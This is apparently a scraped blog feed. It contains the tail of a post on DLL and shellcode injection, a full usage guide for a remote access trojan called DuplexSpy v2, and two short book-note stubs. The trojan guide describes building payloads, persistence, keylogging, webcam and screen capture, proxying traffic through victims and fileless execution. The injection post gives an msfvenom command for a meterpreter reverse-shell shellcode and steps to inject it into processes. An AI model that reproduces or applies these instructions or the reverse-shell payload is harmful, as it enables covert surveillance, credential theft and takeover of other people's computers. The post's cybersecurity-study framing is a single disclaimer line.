title="NtCreateThreadEx"></a>NtCreateThreadEx</h3><p><strong>NtCreateThreadEx</strong> method:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.4.png'><img src="/images/article/tools/duplexspy/injector/dll.4.png" width="600"></p><p>It works again ( . 3 .)</p><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="400"></p><h3 id="ZwCreateThreadEx"><a href="#ZwCreateThreadEx" class="headerlink" title="ZwCreateThreadEx"></a>ZwCreateThreadEx</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/dll.5.png'><img src="/images/article/tools/duplexspy/injector/dll.5.png" width="600"></p><h2 id="Shellcode-Injection"><a href="#Shellcode-Injection" class="headerlink" title="Shellcode Injection"></a>Shellcode Injection</h2><p>This method is fileless.</p><p>The <code>CreateRemoteThread</code> method is recommended for shellcode injection.</p><p>Use the following command to generate a meterpreter shellcode:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f c<br></code></pre></td></tr></table></figure></p><p>Paste the output into the shellcode editor of DuplexSpy.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.5.png'><img src="/images/article/tools/duplexspy/injector/sc.5.png" width="600"></p><p>Click the “Formatting” button at the top of the window form. You can also click the “Save” button, DuplexSpy automatically runs the “Formatting” function.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.6.png'><img src="/images/article/tools/duplexspy/injector/sc.6.png" width="600">    <figcaption>    Formatting    </figcapton></p><h3 id="CreateRemoteThread-1"><a href="#CreateRemoteThread-1" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.1.png'><img src="/images/article/tools/duplexspy/injector/sc.1.png" width="600"></p><h3 id="NtCreateThreadEx-1"><a href="#NtCreateThreadEx-1" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h3><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.2.png'><img src="/images/article/tools/duplexspy/injector/sc.2.png" width="600"></p><h3 id="ZwCreateThreadEx-1"><a href="#ZwCreateThreadEx-1" class="headerlink" title="ZwCreateThreadEx"></a>ZwCreateThreadEx</h3><p>Lastly, let’s try the <strong>ZwCreateThreadEx</strong> method. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.3.png'><img src="/images/article/tools/duplexspy/injector/sc.3.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/injector/sc.4.png'><img src="/images/article/tools/duplexspy/injector/sc.4.png" width="600"></p><h2 id="Loader"><a href="#Loader" class="headerlink" title="Loader"></a>Loader</h2><p>DuplexSpy allows you to load a DLL file or shellcode directly without injecting it into an existing process. As with injection, the payload architecture must match the loader architecture (x86 or x64).</p><p>For performance reasons, DuplexSpy creates a new process for both DLL and shellcode loading. This behavior is similar to the fileless execution features of DuplexSpy; however, the loader architecture cannot be selected manually. If the DuplexSpy payload is x64, only x64 DLLs or shellcodes can be loaded.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/1.svg'><img src="/images/article/tools/duplexspy/loader/1.svg" width="800"></p><h3 id="DLL-Loader"><a href="#DLL-Loader" class="headerlink" title="DLL Loader"></a>DLL Loader</h3><p>Note that this method is not fileless. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/dll.1.png'><img src="/images/article/tools/duplexspy/loader/dll.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/dll.2.png'><img src="/images/article/tools/duplexspy/loader/dll.2.png" width="600"></p><h3 id="Shellcode-Loader"><a href="#Shellcode-Loader" class="headerlink" title="Shellcode Loader"></a>Shellcode Loader</h3><p>DuplexSpy allows you to load shellcode into memory. It is a fileless method.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.1.png'><img src="/images/article/tools/duplexspy/loader/shellcode.1.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.2.png'><img src="/images/article/tools/duplexspy/loader/shellcode.2.png" width="600"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/loader/shellcode.3.png'><img src="/images/article/tools/duplexspy/loader/shellcode.3.png" width="600"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article demonstrates how </summary>
      
    
    
    
    <category term="DuplexSpy" scheme="http://example.com/categories/DuplexSpy/"/>
    
    
    <category term="DuplexSpy" scheme="http://example.com/tags/DuplexSpy/"/>
    
    <category term="Tool" scheme="http://example.com/tags/Tool/"/>
    
    <category term="DLL Injection" scheme="http://example.com/tags/DLL-Injection/"/>
    
    <category term="Shell Injection" scheme="http://example.com/tags/Shell-Injection/"/>
    
    <category term="DLL Loader" scheme="http://example.com/tags/DLL-Loader/"/>
    
    <category term="Shell Loader" scheme="http://example.com/tags/Shell-Loader/"/>
    
  </entry>
  
  <entry>
    <title>[Tools] DuplexSpy v2.0.0</title>
    <link href="http://example.com/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/"/>
    <id>http://example.com/2026/01/28/2026-1-28-ToolsDuplexSpy-v2-0-0/</id>
    <published>2026-01-27T16:29:37.000Z</published>
    <updated>2026-02-07T04:35:40.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>This document describes <strong>DuplexSpy</strong> (also referred to as <strong>DuplexSpyCS</strong>, where <em>CS</em> stands for C#).</p><p>If you are reading this document, I am glad to announce the release of <strong>DuplexSpy version 2</strong>, after more than six months of the version 1. During this period, I struggled with various emotional and academic issues, which once led me into depression. Fortunately, I managed to overcome one of my biggest personal challenges (even though it might seem trivial to others).</p><p align="center" class='item-img' data-src='/images/meme/hakari_crying.jpeg'><img src="/images/meme/hakari_crying.jpeg" width="600"></p><p>As a college student, developing a GUI-based remote access tool entirely on my own—and performing proper quality assurance (QA)—has been a significant challenge for me. Due to limited time, experience, and resources, this project may still contain defects or design flaws that I have not yet discovered. Nevertheless, I believe that I have successfully built a RAT that incorporates a variety of offensive techniques and practical features.</p><p align="center" class='item-img' data-src='/images/meme/terrible_cake.png'><img src="/images/meme/terrible_cake.png" width="300"></p><p>If you find this project helpful or informative, I would truly appreciate a ⭐ on the repository. Your support would be a great motivation for me to continue improving this tool.</p><p align="center" class='item-img' data-src='/images/meme/mika_yeah.png'><img src="/images/meme/mika_yeah.png" width="300"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p><strong>DuplexSpy</strong> incorporates features inspired by other tools as well as my own personal experience. Compared to the previous version, I removed several features that I considered unnecessary and added a number of new ones. Throughout this development process, I learned a great deal, and I sincerely hope that this project can be useful to others who are interested in offensive security or malware research.</p><p>If you encounter any issues or have suggestions, please feel free to open an issue on the repository page.</p><p>View the GitHub repository <a href="https://github.com/iss4cf0ng/DuplexSpyCS">here</a>.</p><h1 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h1><p>This project was developed as part of my personal interest in studying cybersecurity. However, it may potentially be misused for malicious purposes. Please do <strong>NOT</strong> use this tool for any illegal activities.</p><p align="center" class='item-img' data-src='/images/meme/mika_punch.jpg'><img src="/images/meme/mika_punch.jpg" width="500"></p><h1 id="Getting-Start"><a href="#Getting-Start" class="headerlink" title="Getting Start"></a>Getting Start</h1><h2 id="Directory-and-Files"><a href="#Directory-and-Files" class="headerlink" title="Directory and Files"></a>Directory and Files</h2><p>Directory structure is shown as following:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/main/3.png'><img src="/images/article/tools/duplexspy/main/3.png" width="700"></p><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><p>Execute <code>DuplexSpyCS.exe</code>. This is the home page of DuplexSpy:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/main/1.png'><img src="/images/article/tools/duplexspy/main/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/main/2.png'><img src="/images/article/tools/duplexspy/main/2.png" width="700"></p><h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><p>A listener is an interface component of <strong>DuplexSpy</strong>. It acts as a socket listener on the server side. DuplexSpy provides three types of listeners, all of which offer secure and robust communication protocols.</p><h3 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h3><p>The data stream transmitted through this protocol is encrypted after a key exchange procedure. The server generates an RSA key pair and sends the public key to the client. The client then uses this public key to encrypt an AES key and an initialization vector (IV), and sends them back to the server.</p><p>After receiving the encrypted AES key and IV, the server decrypts them and stores them in memory. During the validation phase, the server sends a plaintext challenge to the client. The client responds with an encrypted version of the challenge using the AES algorithm. If the server can successfully decrypt the response using the stored AES key and IV, the validation procedure is considered complete. The server then notifies the client to enter the compromised state.</p><p>This protocol uses RSA-2048 and AES-256-CBC.</p><h3 id="TLS"><a href="#TLS" class="headerlink" title="TLS"></a>TLS</h3><p>This protocol provides a secure and robust communication channel for C2 traffic. Before using this listener, you must generate an SSL certificate file.</p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>All data are encapsulated within HTTP requests and responses. This listener also provides an encrypted communication channel to protect C2 traffic. Its handshaking procedure is identical to that of the TCP listener described above.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/http.1.png'><img src="/images/article/tools/duplexspy/listener/http.1.png" width="1000"></p><h2 id="Add-a-New-Listener"><a href="#Add-a-New-Listener" class="headerlink" title="Add a New Listener"></a>Add a New Listener</h2><p>In this example, I am going to demonstrate how to add a new listener.</p><p>Firstly, click the <strong>New</strong> button on the top.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/1.png'><img src="/images/article/tools/duplexspy/listener/1.png" width="700"></p><p>Now you have opened a new panel.</p><p>Select a protocol used for listener (In this case, I use <strong>TLS</strong>):</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/2.png'><img src="/images/article/tools/duplexspy/listener/2.png" width="400"></p><p>Notice that you should create a certificate file if you are going to use a TLS listener. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/3.png'><img src="/images/article/tools/duplexspy/listener/3.png" width="400">    <figcaption>    Save configuration without SSL certificate file.    </figcaption></p><p>You can create a certificate file through <code>openssl</code> command or using DuplexSpy. </p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/5.png'><img src="/images/article/tools/duplexspy/listener/5.png" width="400"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/6.png'><img src="/images/article/tools/duplexspy/listener/6.png" width="400"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/7.png'><img src="/images/article/tools/duplexspy/listener/7.png" width="700"></p><p>DuplexSpy checks the listener configuration before it shows. If a mal-config is detected. The state of your listener will be turned into <strong>unavailable</strong>.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/listener/4.png'><img src="/images/article/tools/duplexspy/listener/4.png" width="700"></p><h2 id="Generate-a-Payload"><a href="#Generate-a-Payload" class="headerlink" title="Generate a Payload"></a>Generate a Payload</h2><p>DuplexSpy currently provides a single payload type. In the previous version, three different payload types were available, but issues were discovered in the other two. These will be addressed in a future release.</p><p>To generate a payload, click <strong>Build</strong> on the home page.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/build/1.png'><img src="/images/article/tools/duplexspy/build/1.png" width="400"></p><h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><p>DuplexSpy provides two persistence methods. The first one is copy the payload to <strong>StartUp</strong> directory, and the second method is modifying the registry data. The latter method is called at the end of copying file.</p><h2 id="Infected"><a href="#Infected" class="headerlink" title="Infected"></a>Infected</h2><p>Like other remote access tools, the target can be infected by directly executing the <code>.exe</code> file. Once the remote machine is compromised and successfully connects to the server, it will appear as an available item on the home page.</p><p>If you see this, congratulations, you can now use the provided functions.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/build/2.png'><img src="/images/article/tools/duplexspy/build/2.png" width="700"></p><p>The context menu displays all available functions.</p><h1 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h1><p>The <strong>Manager</strong> provides the following remote administration features:</p><ul><li>File Manager</li><li>Task Manager</li><li>Service Manager</li><li>Registry Editor</li><li>Connection View</li><li>Window Manager</li></ul><h2 id="File-Manager"><a href="#File-Manager" class="headerlink" title="File Manager"></a>File Manager</h2><p>The File Manager provides the following functions:</p><ul><li><strong>Show Image</strong></li><li><strong>New</strong></li><li><strong>Edit</strong></li><li><strong>Copy</strong></li><li><strong>Paste</strong></li><li><strong>Move</strong></li><li><strong>Delete</strong></li><li><strong>Upload</strong></li><li><strong>Download</strong></li><li><strong>WGET</strong></li><li><strong>Archive</strong></li><li><strong>Datetime</strong></li><li><strong>Shortcut</strong></li><li><strong>Copy Path</strong></li></ul><p>Toolbar functions:</p><ul><li><strong>Home</strong></li><li><strong>Parent</strong></li><li><strong>Refresh</strong></li><li><strong>New</strong></li><li><strong>Select</strong></li><li><strong>Execute</strong></li><li><strong>Shell</strong></li><li><strong>Find</strong></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/file.1.png'><img src="/images/article/tools/duplexspy/manager/file.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/file.2.png'><img src="/images/article/tools/duplexspy/manager/file.2.png" width="700"></p><h2 id="Task-Manager"><a href="#Task-Manager" class="headerlink" title="Task Manager"></a>Task Manager</h2><ul><li><strong>Injector</strong> – Perform DLL or shellcode injection, <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/">click this</a> to learn more about this feature.</li><li><strong>Start</strong>:</li><li><strong>Kill</strong></li><li><strong>Kill + Delete</strong></li><li><strong>Suspend</strong></li><li><strong>Resume</strong></li><li><strong>Copy</strong></li><li><strong>Find Antivirus</strong></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/task.1.png'><img src="/images/article/tools/duplexspy/manager/task.1.png" width="700"></p><h2 id="RegEdit"><a href="#RegEdit" class="headerlink" title="RegEdit"></a>RegEdit</h2><p>DuplexSpy implements a simple registry editor with a GUI similar to <code>regedit.exe</code></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/reg.1.png'><img src="/images/article/tools/duplexspy/manager/reg.1.png" width="700"></p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Displays all Windows services on the compromised machine.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/serv.1.png'><img src="/images/article/tools/duplexspy/manager/serv.1.png" width="700"></p><h2 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h2><p>Displays all active network connections.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/conn.1.png'><img src="/images/article/tools/duplexspy/manager/conn.1.png" width="700"></p><h2 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h2><p>Displays all open windows and provides the following features:</p><ul><li><strong>Capture</strong><ul><li><strong>GetDC</strong></li><li><strong>Foreground</strong></li></ul></li><li><strong>Go to TaskMgr</strong></li><li><strong>Copy</strong></li><li><strong>Thread</strong><ul><li><strong>Suspend</strong></li><li><strong>Resume</strong></li></ul></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/window.1.png'><img src="/images/article/tools/duplexspy/manager/window.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/manager/window.2.png'><img src="/images/article/tools/duplexspy/manager/window.2.png" width="700"></p><h1 id="Terminal"><a href="#Terminal" class="headerlink" title="Terminal"></a>Terminal</h1><p>DuplexSpy provides two types of <code>cmd.exe</code> terminal and a WQL console.</p><h2 id="Virtual-Terminal"><a href="#Virtual-Terminal" class="headerlink" title="Virtual Terminal"></a>Virtual Terminal</h2><p>A traditional virtual terminal commonly found in RATs.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/terminal/shell.png'><img src="/images/article/tools/duplexspy/terminal/shell.png" width="700"></p><h2 id="Xterm-Terminal"><a href="#Xterm-Terminal" class="headerlink" title="Xterm Terminal"></a>Xterm Terminal</h2><p>Inspired by <strong>MobaXterm</strong>, this terminal provides an interactive console supporting tools such as:</p><ul><li><code>nc.exe</code></li><li><code>python</code></li><li><code>nmap</code></li><li><code>sqlmap</code></li><li><code>ssh</code></li><li><code>telnet</code></li><li><code>netsh</code></li></ul><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/terminal/xterm.png'><img src="/images/article/tools/duplexspy/terminal/xterm.png" width="700"></p><h2 id="WQL"><a href="#WQL" class="headerlink" title="WQL"></a>WQL</h2><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/terminal/wql.png'><img src="/images/article/tools/duplexspy/terminal/wql.png" width="700"></p><h1 id="Desktop"><a href="#Desktop" class="headerlink" title="Desktop"></a>Desktop</h1><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/monitor/1.png'><img src="/images/article/tools/duplexspy/monitor/1.png" width="700"></p><h1 id="Webcam"><a href="#Webcam" class="headerlink" title="Webcam"></a>Webcam</h1><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/webcam/1.png'><img src="/images/article/tools/duplexspy/webcam/1.png" width="700"></p><h1 id="Audio"><a href="#Audio" class="headerlink" title="Audio"></a>Audio</h1><p>Captures audio streams from microphones or speakers. The received audio can be saved as an <code>.mp3</code> file.</p><h1 id="FunStuff"><a href="#FunStuff" class="headerlink" title="FunStuff"></a>FunStuff</h1><p>Inspired by the classic <strong>Beast RAT</strong>, this module provides a collection of interactive and demonstrative features, including:</p><ul><li><strong>MessageBox</strong></li><li><strong>Balloon Tips</strong></li><li><strong>Toggle</strong><ul><li><strong>Mouse</strong><ul><li>Hide / Show the mouse cursor</li><li>Lock / Unlock the mouse cursor</li><li>Enable / Disable mouse trails</li></ul></li><li><strong>hWnd</strong><ul><li>Hide / Show the system tray</li><li>Hide / Show the system clock</li><li>Hide / Show the taskbar</li><li>Hide / Show the Start Orb (the Start button at the lower-left corner of the screen)</li></ul></li><li><strong>Keyboard</strong><ul><li><strong>Smile</strong>: Replace all keyboard input with a smiley face. For example, typing <code>HelloWorld</code> will result in ten 😊 characters.</li><li>Enable / Disable keyboard input</li></ul></li></ul></li><li><strong>Image</strong><ul><li><strong>Wallpaper</strong>: Change or retrieve the current wallpaper of the compromised machine</li><li><strong>LockScreen</strong>: Display a specified image while disabling keyboard input and hiding the mouse cursor</li></ul></li></ul><h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><p>The <strong>Proxy</strong> feature is designed to demonstrate a common misconception: some people believe that compromising their computer is harmless because it contains no important data. This assumption is incorrect. Even if no sensitive data is present, a compromised machine can still be abused as a proxy to conceal the attacker’s real identity.</p><p>The <strong>Proxy</strong> function establishes a listener on the C2 server and accepts SOCKS5 connections from users. Network traffic is then forwarded through the compromised machine. The overall architecture is illustrated below:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/proxy/10.png'><img src="/images/article/tools/duplexspy/proxy/10.png" width="1000"></p><p>This feature allows attackers to browse the internet, watch YouTube, or even perform <strong>SSH logins to remote servers</strong> through the compromised host.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyProxy/">click here</a>.</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Keylogger"><a href="#Keylogger" class="headerlink" title="Keylogger"></a>Keylogger</h2><p>Years ago, when I was a beginner in cybersecurity, I was curious about how a keylogger could endanger user credentials if it only logged keystrokes. Later, I realized that the issue lies in practical design rather than raw data itself.</p><p>DuplexSpy demonstrates how an offensive keylogger is implemented—not only recording the keys pressed by the user, but also capturing the timestamp and the active window title.</p><p align="center" class='item-img' data-src='https://raw.githubusercontent.com/iss4cf0ng/DuplexSpyCS/refs/heads/main/png/keylogger.png'><img src="https://raw.githubusercontent.com/iss4cf0ng/DuplexSpyCS/refs/heads/main/png/keylogger.png" width="700"></p><h2 id="Chat-Message"><a href="#Chat-Message" class="headerlink" title="Chat Message"></a>Chat Message</h2><p>This feature allows you to have a conversation with the user who is currently logged on to the compromised machine.<br>Currently, it supports single-user sessions and text messages only.</p><h2 id="Run-Script"><a href="#Run-Script" class="headerlink" title="Run Script"></a>Run Script</h2><p>Execute customized scripts. DuplexSpy provides three types of executable scripts:</p><ul><li>Batch</li><li>C#</li><li>VB.NET</li></ul><p>Both C# and VB.NET scripts are executed filelessly, while Batch scripts are not.</p><h2 id="PC-Power"><a href="#PC-Power" class="headerlink" title="PC Power"></a>PC Power</h2><p>This function includes:</p><ul><li>Restart</li><li>Logout</li><li>Shutdown</li><li>Sleep</li></ul><p>All actions will be executed after a specified delay.<br>Note that the compromised machine will be disconnected after the action is triggered.</p><h2 id="Fileless-Execution"><a href="#Fileless-Execution" class="headerlink" title="Fileless Execution"></a>Fileless Execution</h2><p>This feature allows you to execute a PE file without writing it to disk (<strong>fileless execution</strong>).</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyFilelessExec/">click this</a>.</p><h2 id="DLL-Loader"><a href="#DLL-Loader" class="headerlink" title="DLL Loader"></a>DLL Loader</h2><p>This feature writes a DLL to a temporary file (<code>%temp%</code>) and loads it using Win32 APIs.<br>Note that this feature is <strong>not fileless</strong>.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/">click this</a>.</p><h2 id="Shellcode-Loader"><a href="#Shellcode-Loader" class="headerlink" title="Shellcode Loader"></a>Shellcode Loader</h2><p>Load shellcode directly into memory. This feature <strong>IS FILELESS</strong>.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyDllAndShellcode/">click this</a>.</p><h1 id="Plugin"><a href="#Plugin" class="headerlink" title="Plugin"></a>Plugin</h1><p>This feature allows you to load a .NET Framework 4.8 assembly into memory, pass parameters to it, and execute customized functions.</p><p>To learn more, please <a href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyPlugin/">click this</a>.</p><h1 id="Batch"><a href="#Batch" class="headerlink" title="Batch"></a>Batch</h1><p>For convenience, DuplexSpy provides several features grouped under <strong>Batch</strong>.<br>These functions allow you to execute multiple operations or commands described above in a single workflow.</p><h2 id="Desktop-1"><a href="#Desktop-1" class="headerlink" title="Desktop"></a>Desktop</h2><p>This idea is inspired by CCTV monitoring systems.<br>Each page displays up to 9 desktops.</p><h2 id="Webcam-1"><a href="#Webcam-1" class="headerlink" title="Webcam"></a>Webcam</h2><p>This idea is also inspired by CCTV monitoring systems.<br>Each page displays up to 9 webcams. Unlike <strong>Multi-Desktop</strong>, webcam images are not displayed automatically.</p><h2 id="Lock-Screen"><a href="#Lock-Screen" class="headerlink" title="Lock Screen"></a>Lock Screen</h2><p>This idea comes from the comic <em>Keroro Gunso</em>.<br>In the story, an alien character hijacks multiple computers and displays a star logo while their team invades Earth.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/1.png'><img src="/images/article/tools/duplexspy/lockscreen/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/2.png'><img src="/images/article/tools/duplexspy/lockscreen/2.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/3.png'><img src="/images/article/tools/duplexspy/lockscreen/3.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/lockscreen/4.png'><img src="/images/article/tools/duplexspy/lockscreen/4.png" width="700"></p><h2 id="Run-Script-1"><a href="#Run-Script-1" class="headerlink" title="Run Script"></a>Run Script</h2><p>Send customized scripts to compromised machines.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/runscript/1.png'><img src="/images/article/tools/duplexspy/runscript/1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/runscript/2.png'><img src="/images/article/tools/duplexspy/runscript/2.png" width="700"></p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>Open a URL or download an executable from a specified URL.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/url/1.png'><img src="/images/article/tools/duplexspy/url/1.png" width="700"></p><h1 id="Connection-1"><a href="#Connection-1" class="headerlink" title="Connection"></a>Connection</h1><ul><li><strong>Reconnect</strong>: Notify the remote computer to reconnect to the server.</li><li><strong>Disconnect</strong>: Notify the remote computer to disconnect from the server. The payload will be terminated.</li></ul><h1 id="Client"><a href="#Client" class="headerlink" title="Client"></a>Client</h1><ul><li><strong>Sleep</strong>: Disconnect from the C2 server and reconnect after a specified delay.</li><li><strong>Update</strong>: Send a new payload to the compromised machine, delete the old payload, and execute the new one (<strong>not fileless</strong>).</li><li><strong>Remove</strong>: Terminate and delete the payload on the compromised machine.</li></ul><h1 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h1><p>Some functions are executed on your server only:</p><ul><li><strong>Open Folder</strong>: When a compromised machine is online, DuplexSpy creates a dedicated folder for it. This feature allows you to open the folder via <code>explorer.exe</code>.</li><li><strong>Highlight</strong>: Highlight the selected items.</li></ul><h1 id="Copy"><a href="#Copy" class="headerlink" title="Copy"></a>Copy</h1><p>This function also runs on your server only.<br>It allows you to copy the online ID or IPv4 address to your clipboard.</p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="400"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Preface&quot;&gt;&lt;a href=&quot;#Preface&quot; class=&quot;headerlink&quot; title=&quot;Preface&quot;&gt;&lt;/a&gt;Preface&lt;/h1&gt;&lt;p&gt;This document describes &lt;strong&gt;DuplexSpy&lt;/strong&gt;</summary>
      
    
    
    
    <category term="Tools" scheme="http://example.com/categories/Tools/"/>
    
    
    <category term="Code" scheme="http://example.com/tags/Code/"/>
    
    <category term="C#" scheme="http://example.com/tags/C/"/>
    
    <category term="Program" scheme="http://example.com/tags/Program/"/>
    
    <category term="DuplexSpy" scheme="http://example.com/tags/DuplexSpy/"/>
    
    <category term="RAT" scheme="http://example.com/tags/RAT/"/>
    
  </entry>
  
  <entry>
    <title>[Book] Windows Internal Part 2</title>
    <link href="http://example.com/2026/01/26/2026-1-26-BookWindowsInternal-P2/"/>
    <id>http://example.com/2026/01/26/2026-1-26-BookWindowsInternal-P2/</id>
    <published>2026-01-26T03:30:22.000Z</published>
    <updated>2026-01-27T07:34:05.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/WindowsInternal2/libro.jpg'><img src="/images/books/WindowsInternal2/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Windows Internal Part 2”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;El-libro&quot;&gt;&lt;a href=&quot;#El-libro&quot; class=&quot;headerlink&quot; title=&quot;El libro&quot;&gt;&lt;/a&gt;El libro&lt;/h1&gt;&lt;p align=&quot;center&quot; class=&#39;item-img&#39; data-src=&#39;/ima</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>[Book] Windows Internal Part 1</title>
    <link href="http://example.com/2026/01/26/2026-1-26-BookWindowsInternal-P1/"/>
    <id>http://example.com/2026/01/26/2026-1-26-BookWindowsInternal-P1/</id>
    <published>2026-01-26T03:29:20.000Z</published>
    <updated>2026-01-29T10:56:48.047Z</updated>
    
    <content type="html"><![CDATA[<h1 id="El-libro"><a href="#El-libro" class="headerlink" title="El libro"></a>El libro</h1><p align="center" class='item-img' data-src='/images/books/WindowsInternal1/libro.jpg'><img src="/images/books/WindowsInternal1/libro.jpg" width="500"></p><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article is used to keep notes and summaries of the book “Windows Internal Part 1”.<br>The content will be continuously updated as I read through the book.</p><h1 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h1><h1 id="Chapter-1-Concepts-and-Tools"><a href="#Chapter-1-Concepts-and-Tools" class="headerlink" title="Chapter 1 - Concepts and Tools"></a>Chapter 1 - Concepts and Tools</h1><h2 id="Fundation-concepts-and-terms"><a href="#Fundation-concepts-and-terms" class="headerlink" title="Fundation concepts and terms"></a>Fundation concepts and terms</h2><h3 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h3><p>The Windows application programming interface (API) is the user-mode system programming interface to the Windows OS family. Prior to the 